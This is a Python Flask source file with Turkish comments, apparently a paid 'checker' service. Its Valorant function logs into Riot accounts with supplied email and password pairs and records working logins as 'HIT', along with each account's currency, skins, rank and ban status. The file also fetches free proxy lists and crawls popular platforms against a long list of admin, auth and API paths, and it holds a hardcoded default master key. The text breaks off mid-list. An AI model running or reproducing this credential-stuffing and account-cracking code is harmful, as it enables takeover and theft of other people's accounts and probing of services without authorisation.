#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin)
"""

import os, json, re, time, random, string, threading, webbrowser, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (GİZLENDİ - ENV'DEN ALIYOR)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ (SADECE ADMIN GÖRÜR)
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
        else:
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# VALORANT CHECKER (GERÇEK API)
# ============================================================
def check_valorant_account(email, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?",
            "region": "?"
        },
        "message": ""
    }
    try:
        r = session.post("https://auth.riotgames.com/api/v1/authorization", json={
            "client_id": "riot-client",
            "nonce": "1",
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban account email mobile_number"
        }, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Auth başarısız"
            return result

        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")

        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent = r.json()
            if ent.get("entitlements_token"):
                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})

        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                region = r.json().get("affinity", "eu")
        except:
            pass
        result["details"]["region"] = region

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
        except:
            pass

        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                w = r.json()
                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                result["details"]["skins"] = len(r.json().get("Entitlements", []))
        except:
            pass

        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
                    if seasons:
                        first = list(seasons.values())[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
        except:
            pass

        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
        except:
            pass

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email} | Bölge:{region} Level:{result['details']['level']} VP:{result['details']['vp']} Skin:{result['details']['skins']}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hata: {email} - {str(e)}", "ERROR")

    return result

# ============================================================
# KATEGORİZASYON (API Discovery)
# ============================================================
def categorize_endpoint(endpoint):
    ep = endpoint.lower()
    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
        return 'Auth'
    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
        return 'Admin'
    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
        return 'User'
    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
        return 'Health'
    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
        return 'API'
    else:
        return 'Genel'

# ============================================================
# ENDPOINT ÇIKARICILAR
# ============================================================
def extract_from_html(html, base_url):
    endpoints = set()
    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
        href = m.group(1)
        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
            endpoints.add(href)
    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
        endpoints.add(m.group(1))
    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
        endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_js(js, base_url):
    endpoints = set()
    patterns = [
        r'fetch\s*\(\s*["\']([^"\']+)["\']',
        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
    ]
    for pattern in patterns:
        for m in re.finditer(pattern, js, re.I):
            endpoints.add(m.group(1))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

def extract_from_json(obj, base_url):
    endpoints = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
                    endpoints.add(v)
            elif isinstance(v, (dict, list)):
                endpoints.update(extract_from_json(v, base_url))
    elif isinstance(obj, list):
        for item in obj:
            endpoints.update(extract_from_json(item, base_url))
    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]

# ============================================================
# PROXY FONKSİYONU
# ============================================================
def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# TARAMA MOTORU (API Discovery)
# ============================================================
class APIScanner:
    def __init__(self, proxy_list=None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })
        if proxy_list:
            proxy = random.choice(proxy_list) if proxy_list else None
            if proxy:
                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        self.discovered = set()
        self.results = []
        self.base_url = ""

    def scan(self, domain):
        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
        self.base_url = self.base_url.rstrip('/')
        self.results = []
        self.discovered = set()

        static = self._get_common_endpoints()
        for ep in static:
            full = urljoin(self.base_url, ep)
            if full not in self.discovered:
                self._test(full, ep)

        self._crawl(self.base_url)

        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
        for js_url in js_urls:
            self._crawl_js(js_url)

        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
        for api_url in api_urls:
            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
                self._crawl(api_url)

        return self.results

    def _get_common_endpoints(self):
        return [
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/rest", "/rest/v1", "/rest/v2",
            "/graphql", "/api/graphql", "/v1/graphql",
            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
            "/admin", "/dashboard", "/panel", "/manage", "/system",
            "/health", "/ping", "/status", "/check", "/heartbeat",
            "/search", "/query", "/find", "/list",
            "/upload", "/download", "/file", "/files",
            "/notify", "/notification", "/alert",
            "/report", "/logs", "/audit", "/analytics",
            "/config", "/configuration",
            "/sync", "/import", "/export", "/backup",
            "/reset", "/recover", "/verify", "/validate",
            "/2fa", "/twofactor", "/mfa",
            "/webhook", "/callback", "/hook",
            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
            "/passport", "/passport/web", "/passport/web/email/login",
            "/passport/web/phone/login", "/passport/web/sms/send",
            "/api/user/info", "/api/user/follow", "/api/user/unfollow",
            "/api/video/list", "/api/video/info", "/api/video/upload",
            "/api/comment/list", "/api/comment/post", "/api/comment/delete",
            "/api/like", "/api/unlike", "/api/share",
            "/api/live", "/api/live/start", "/api/live/end",
            "/api/shop", "/api/product", "/api/order",
            "/v1/auth", "/v1/login", "/v1/logout", "/v1/register",
            "/v1/user", "/v1/users", "/v1/account", "/v1/profile",
            "/v1/game", "/v1/games", "/v1/inventory", "/v1/currency",
            "/v1/friends", "/v1/groups", "/v1/chat", "/v1/messages",
            "/v1/avatar", "/v1/outfits", "/v1/thumbnails",
            "/v1/asset", "/v1/assets", "/v1/marketplace",
            "/v1/developer", "/v1/universes", "/v1/places",
            "/api/shows", "/api/movies", "/api/genres", "/api/titles",
            "/api/search", "/api/recommendations", "/api/trending",
            "/api/user/profile", "/api/user/history", "/api/user/ratings",
            "/api/user/list", "/api/user/watchlist", "/api/user/continue",
            "/api/subscription", "/api/plans", "/api/payment",
            "/api/account", "/api/settings", "/api/devices",
            "/api/v9", "/api/v9/auth", "/api/v9/login", "/api/v9/register",
            "/api/v9/users", "/api/v9/guilds", "/api/v9/channels",
            "/api/v9/messages", "/api/v9/webhooks", "/api/v9/oauth2",
            "/api/v9/applications", "/api/v9/voice", "/api/v9/stickers",
            "/api/v9/emojis", "/api/v9/invites", "/api/v9/connections",
            "/api/v1/me", "/api/v1/playlists", "/api/v1/tracks", "/api/v1/albums",
            "/api/v1/artists", "/api/v1/search", "/api/v1/recommendations",
            "/api/v1/player", "/api/v1/queue", "/api/v1/library",
            "/api/v1/follow", "/api/v1/shows", "/api/v1/episodes",
            "/api/v1/users", "/api/v1/browse", "/api/v1/categories",
            "/api/epic", "/api/epic
